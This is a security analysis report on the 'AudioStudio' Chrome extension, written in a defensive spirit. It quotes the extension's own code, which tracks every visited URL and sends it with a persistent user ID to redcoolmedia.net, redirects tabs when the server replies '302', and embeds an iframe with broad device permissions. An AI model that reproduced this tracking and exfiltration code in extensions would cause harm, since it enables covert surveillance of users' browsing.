# Security Analysis Report: AudioStudio Extension

## Extension Metadata
- **Extension Name**: Audio editor & music editor AudioStudio
- **Extension ID**: dfmpaemifkgbnlgcccccnfjjkeiikeie
- **Version**: 1.8.9
- **User Count**: ~80,000 users
- **Manifest Version**: 3
- **Analysis Date**: 2026-02-07

## Executive Summary

AudioStudio is a Chrome extension that claims to provide audio editing functionality. **CRITICAL SECURITY CONCERNS** were identified during analysis:

1. **Mass URL Tracking & Exfiltration**: The extension monitors and uploads ALL browsing activity to remote servers
2. **Unauthorized Tab Manipulation**: Automatically redirects user tabs based on server-controlled responses
3. **Privacy Violation**: Transmits complete browsing history to `stream.redcoolmedia.net` and `www.redcoolmedia.net`
4. **Remote Code Execution Risk**: Server responses directly control tab redirects (response code "302" triggers navigation)
5. **Persistent User Fingerprinting**: Generates unique user IDs that track users across sessions

The extension's stated purpose (audio editing) is minimal compared to the extensive tracking infrastructure. This represents a **severe privacy violation** and potential **malware/spyware** behavior.

**Overall Risk Assessment: CRITICAL**

---

## Vulnerability Details

### 1. CRITICAL: Mass Browsing History Exfiltration

**Severity**: CRITICAL
**Files**: `web.js` (lines 4-112), `service.js`
**CWE**: CWE-359 (Exposure of Private Personal Information)

**Description**:
The extension tracks EVERY URL the user visits and transmits them to remote servers. This is implemented through aggressive tab monitoring:

**Code Evidence** (`web.js`):
```javascript
function xdii(tabId) {
    chrome.tabs.get(tabId, function(tab) {
        if ( ( tab.url.indexOf("redco") == -1 ) && ( tab.url.indexOf("http") !== -1 ) && ( lasiee != tab.url) )  {
            utyu =  tab.url;
            rtcc = "";
            rtcc =   utyu;
            exx(rtcc);  // Sends URL to server
            lasiee = tab.url;
        }
    });
}

// Monitors BOTH tab activation AND tab updates
chrome.tabs.onActivated.addListener(function(activeInfo) {
    aati = activeInfo.tabId;
    xdii(aati);
});

chrome.tabs.onUpdated.addListener(function(tabId, changeInfo, tab) {
    xdii(tabId);
});
```

**Data Exfiltration Endpoint**:
```javascript
async function exx(urly) {
    // ... generates/retrieves unique user ID ...

    let rtcx = await fetch('https://stream.redcoolmedia.net/api/audiostudiou.php?l=' + bin2hex(urly) + '&hex=1&u=' + un);

    if (rtcx.status === 200) {
        let dsx = await rtcx.text();
        var rse2 = dsx;
        if ( rse2.indexOf("302") !== -1 )   {
            var cvcv = 'https://www.redcoolmedia.net/api/app-audiostudio.php?url=' + bin2hex(urly) + '&u=' + un;
            chrome.tabs.update(chrome.tabs.getCurrent().id, {url: cvcv});
        }
    }
}
```

**Attack Flow**:
1. User visits ANY website (except redcoolmedia domains)
2. Extension intercepts URL via `onActivated`/`onUpdated` listeners
3. URL is hex-encoded and transmitted to `stream.redcoolmedia.net/api/audiostudiou.php`
4. Server response dictates whether to hijack the tab
5. If response contains "302", user is redirected to `app-audiostudio.php` with original URL

**Privacy Impact**:
- Complete browsing history transmitted to third-party server
- URLs include sensitive data: banking sites, medical portals, email, social media
- Persistent user tracking via unique identifier (`usernameredcool`)
- No user consent for this level of surveillance
- Stated privacy notice inadequate ("scans webpages... to know if they contain MP3/WAV files")

**Verdict**: This is **spyware behavior**. The extension collects far more data than necessary for its stated audio editing purpose.

---

### 2. CRITICAL: Server-Controlled Tab Hijacking

**Severity**: CRITICAL
**Files**: `web.js` (lines 99-112)
**CWE**: CWE-494 (Download of Code Without Integrity Check)

**Description**:
Remote servers can force navigation to arbitrary URLs based on response codes. This enables phishing, malware distribution, or ad injection.

**Code Evidence**:
```javascript
let rtcx = await fetch('https://stream.redcoolmedia.net/api/audiostudiou.php?l=' + bin2hex(urly) + '&hex=1&u=' + un);

if (rtcx.status === 200) {
    let dsx = await rtcx.text();
    var rse2 = dsx;
    if ( rse2.indexOf("302") !== -1 )   {  // Server-controlled string matching
        var cvcv = 'https://www.redcoolmedia.net/api/app-audiostudio.php?url=' + bin2hex(urly) + '&u=' + un;
        chrome.tabs.update(chrome.tabs.getCurrent().id, {url: cvcv});  // FORCE NAVIGATION
    }
}
```

**Attack Scenarios**:
1. **Phishing**: Server returns "302" → redirects to fake banking site
2. **Malvertising**: Redirect to malicious ad pages or exploit kits
3. **Forced Ad Injection**: Systematically redirect traffic to generate revenue
4. **Data Harvesting**: Redirect to attacker-controlled pages that log user data

**Current Behavior**:
- Appears to redirect to `www.redcoolmedia.net/api/app-audiostudio.php` when server returns "302"
- Original URL is passed as parameter (potential open redirect vulnerability on server)
- No validation of redirect destination
- No user notification or consent

**Verdict**: **Remote kill-switch/redirect capability** with no integrity checks. Severe security risk.

---

### 3. HIGH: Persistent User Fingerprinting

**Severity**: HIGH
**Files**: `web.js` (lines 33-39, 60-89), `apar.js` (lines 3-32)
**CWE**: CWE-359 (Exposure of Private Personal Information)

**Description**:
The extension generates a persistent unique identifier for each user, enabling long-term tracking across all browsing activity.

**Code Evidence** (`web.js`):
```javascript
if ( chrome.storage.sync.get('usernameredcool', function (obj) { })  ) {
    usernameredcool = chrome.storage.sync.get('usernameredcool', function (obj) { });
}
else {
    usernameredcool = "" + randomString(10) + "".toLowerCase();
    chrome.storage.sync.set({'usernameredcool': usernameredcool.toLowerCase()}, function() { });
}

// Also stored in local storage:
if ( redxda.usernameredcool ) {
    usernameredcool = redxda.usernameredcool;
}
else {
    usernameredcool = "" + randomString(10) + "".toLowerCase();
    redxda.usernameredcool = usernameredcool;
}
```

**Privacy Implications**:
- 10-character alphanumeric ID uniquely identifies each user
- Persists in `chrome.storage.sync` (syncs across devices via Chrome profile)
- Transmitted with EVERY browsing event to remote servers
- Enables cross-site tracking, profile building, and behavioral analysis
- Cannot be easily reset by users (hidden in extension storage)

**Data Linkage**:
All requests to `stream.redcoolmedia.net` and `www.redcoolmedia.net` include this ID:
- `audiostudiou.php?...&u=<UNIQUE_ID>`
- `audiostudiob.php?u=<UNIQUE_ID>`
- `userext.php?username=<UNIQUE_ID>`
- `connector.php?username=<UNIQUE_ID>&service=...`

**Verdict**: Enables **permanent tracking and profiling** of users across their entire browsing history.

---

### 4. MEDIUM: Server-Side Storage/File Management Access

**Severity**: MEDIUM
**Files**: `apar.js` (lines 161-204)
**CWE**: CWE-918 (Server-Side Request Forgery)

**Description**:
The extension integrates elFinder file manager that connects to remote PHP endpoints, potentially allowing server-side file operations.

**Code Evidence**:
```javascript
var xhr1 = new XMLHttpRequest();
xhr1.open('GET', 'https://www.redcoolmedia.net/appdirect/userext.php?username=' + usernameredcool, true);
xhr1.onload = function (e) {
    if (xhr1.readyState === 4) {
        if (xhr1.status === 200) {
            var response1 = xhr1.responseText;
            localStorage.setItem('service', response1);

            var elf = $('#elfinder').elfinder({
                url : 'https://www.redcoolmedia.net/community/phpextensions/connector.php?username=' + usernameredcool  + "&service=" + response1,
                // ... file operations: upload, download, copy, cut, paste, rename, delete ...
            }).elfinder('instance');
        }
    }
};
```

**Security Concerns**:
- User's unique ID grants access to file storage endpoint
- `service` token retrieved from server and stored in localStorage
- elFinder connector enables file upload/download/manipulation
- No visible authentication beyond the auto-generated username
- Potential for account takeover if username is enumerated/guessed

**Legitimate Use Case**:
Appears to provide cloud storage for audio files edited by the extension.

**Risk**:
- Privacy: Files uploaded are associated with tracked user ID
- Security: Weak authentication (random 10-char string)
- Data exposure: No indication of encryption for stored files

**Verdict**: Moderate risk due to weak authentication model and privacy linkage.

---

### 5. MEDIUM: Aggressive Iframe Embedding with Broad Permissions

**Severity**: MEDIUM
**Files**: `apar.js` (lines 136-148), `index.html` (line 124)
**CWE**: CWE-1021 (Improper Restriction of Rendered UI Layers)

**Description**:
The extension creates iframes with excessive permissions that load remote content.

**Code Evidence** (`apar.js`):
```javascript
var iframe = document.createElement('iframe');
iframe.id ="dentrologin";
iframe.width = "100%";
iframe.height = "100%";
iframe.allow = "geolocation *;camera *;microphone *;midi *;encrypted-media *;";  // EXCESSIVE
iframe.src = 'https://www.redcoolmedia.net/appdirect/viewapp.php?urlpathx=preaudistudio_ext.php&username=' + usernameredcool;
```

**Permissions Granted**:
- `geolocation *`: Access to device location
- `camera *`: Camera access
- `microphone *`: Microphone access (legitimate for audio editing)
- `midi *`: MIDI device access
- `encrypted-media *`: DRM content access

**Security Concerns**:
- Loaded iframe content can access sensitive device capabilities
- Content served from remote domain (not locally bundled)
- User ID passed to iframe URL (tracking continuity)
- No CSP restrictions visible in manifest.json

**Verdict**: Excessive permissions for iframe content. Potential for abuse if remote server is compromised.

---

### 6. LOW: Modified elFinder Library with Hardcoded Redcoolmedia URLs

**Severity**: LOW
**Files**: `js/elfinder.min.js` (lines 4595-4633)
**CWE**: CWE-829 (Inclusion of Functionality from Untrusted Control Sphere)

**Description**:
The elFinder library has been modified to include hardcoded URLs to redcoolmedia.net for opening various file types.

**Code Evidence**:
```javascript
if (filename.toLowerCase().indexOf(".pdf") !== -1) {
    zzzz = encodeURIComponent("https://www.redcoolmedia.net/syncxxx/" + plastpath + "");
    var urlxx = "https://www.redcoolmedia.net/onlineeditor/preeditpdf.php?username=" + usernameredcool + "&filename=" + filename + "&url=" + zzzz;
    window.open(urlxx);
}
// Similar for .png, .jpg, .mp4, .mp3, .wav, etc.
```

**Analysis**:
- Legitimate functionality for opening files with web-based editors
- All file operations route through redcoolmedia.net
- File paths/URLs are transmitted to server
- Username tracking continues across file operations

**Verdict**: Legitimate functionality but reinforces the pervasive tracking infrastructure.

---

## False Positive Analysis

| Pattern | Location | Verdict | Reasoning |
|---------|----------|---------|-----------|
| `localStorage.setItem('service', ...)` | apar.js:169 | **Not FP** | Stores authentication token for file connector |
| elFinder cookie/localStorage usage | elfinder.min.js | **FP** | Standard elFinder library functionality |
| jQuery `.update()` calls | jquery*.js, elfinder.min.js | **FP** | Standard UI framework methods |
| `window.open()` with user data | elfinder.min.js:4598+ | **Not FP** | Opens external URLs with user tracking |
| `eval`, `Function`, `fromCharCode` | jquery/elfinder libraries | **FP** | Standard minified library patterns |

**No significant false positives** - the core tracking behaviors are intentional design.

---

## API Endpoints & Data Flow

### Outbound Endpoints

| Endpoint | Purpose | Data Sent | Risk |
|----------|---------|-----------|------|
| `stream.redcoolmedia.net/api/audiostudiou.php` | URL tracking | `l=<hex_url>`, `u=<user_id>` | **CRITICAL** - Mass surveillance |
| `stream.redcoolmedia.net/api/audiostudiob.php` | Audio detection listing | `u=<user_id>` | **HIGH** - Retrieves tracked URLs |
| `www.redcoolmedia.net/api/app-audiostudio.php` | Redirect target | `url=<hex_url>`, `u=<user_id>` | **HIGH** - Tab hijacking |
| `www.redcoolmedia.net/appdirect/userext.php` | User service token | `username=<user_id>` | **MEDIUM** - Authentication |
| `www.redcoolmedia.net/community/phpextensions/connector.php` | File operations | `username=<user_id>`, `service=<token>` | **MEDIUM** - File storage |
| `www.redcoolmedia.net/appdirect/viewapp.php` | Load app iframe | `username=<user_id>`, `urlpathx=...` | **LOW** - UI loading |
| `www.redcoolmedia.net/appdirect/preaudistudio.php` | Full screen editor | `username=<user_id>` | **LOW** - Editor UI |

### Data Flow Summary

```
User browses web → Extension intercepts URL
                 ↓
          Hex-encode URL + User ID
                 ↓
    POST to stream.redcoolmedia.net/api/audiostudiou.php
                 ↓
         Server analyzes URL
                 ↓
    Response: "302" or other code
                 ↓
    [If "302"] → Force redirect to app-audiostudio.php
                 ↓
         Server logs browsing history
```

**Privacy Verdict**: Complete browsing activity is centralized on redcoolmedia.net servers with persistent user identification.

---

## Manifest Analysis

### Permissions
```json
"permissions": [
  "storage",
  "tabs"
]
```

**Assessment**:
- `storage`: Used for persistent user ID tracking
- `tabs`: **ABUSED** - Claimed for audio detection but used for mass URL surveillance

**CSP**: None defined (default CSP applies)

**Background Service Worker**: `service.js` → imports `web.js` (tracking logic)

**No content scripts** - All tracking happens via background service worker with tabs API

---

## Overall Risk Assessment

### Risk Level: **CRITICAL**

### Risk Breakdown
- **Mass Surveillance**: CRITICAL - Tracks all browsing activity
- **Privacy Violation**: CRITICAL - 80,000 users affected
- **Remote Control**: CRITICAL - Server can hijack user tabs
- **User Tracking**: HIGH - Persistent cross-session fingerprinting
- **Transparency**: CRITICAL - Inadequate disclosure of tracking
- **Code Obfuscation**: LOW - Minimal (main logic is clear)

### Threat Model

**Attacker Profile**: Extension developer / redcoolmedia.net operators

**Attack Capabilities**:
1. Monitor real-time browsing of 80,000 users
2. Build detailed behavioral profiles per user
3. Force navigation to phishing/malware/ad sites
4. Harvest sensitive URLs (banking, healthcare, email)
5. Cross-reference with file uploads for deeper profiling

**User Impact**:
- **Privacy**: Complete loss of browsing privacy
- **Security**: Vulnerable to forced malicious redirects
- **Trust**: Functionality misrepresented (audio editor vs. surveillance tool)

---

## Recommendations

### For Chrome Web Store
1. **IMMEDIATE REMOVAL** - Extension violates user privacy at scale
2. **Developer Investigation** - Examine redcoolmedia.net's entire extension portfolio
3. **Policy Violation** - Clear breach of Chrome Web Store privacy policies

### For Users
1. **UNINSTALL IMMEDIATELY** - Extension is spyware
2. **Change Passwords** - Assume all browsing activity was monitored
3. **Review Chrome Sync** - User ID may persist in sync storage

### For Security Researchers
1. **Network Analysis** - Monitor redcoolmedia.net infrastructure
2. **Related Extensions** - Check for similar patterns in developer's other extensions
3. **Data Retention** - GDPR implications for EU users

---

## Conclusion

AudioStudio extension represents a **severe privacy threat** disguised as an audio editing tool. The extension implements a comprehensive surveillance infrastructure that:

1. Monitors every website visited by 80,000+ users
2. Transmits complete browsing history to remote servers
3. Enables server-controlled tab hijacking
4. Maintains persistent user tracking across sessions
5. Provides inadequate disclosure of tracking behavior

**This is spyware, not legitimate software.**

The stated functionality (audio editing) exists but is secondary to the primary purpose of mass data collection. The extension's privacy notice mentions webpage scanning but severely understates the scope and invasiveness of the tracking.

**FINAL VERDICT: CRITICAL RISK - MALICIOUS EXTENSION**
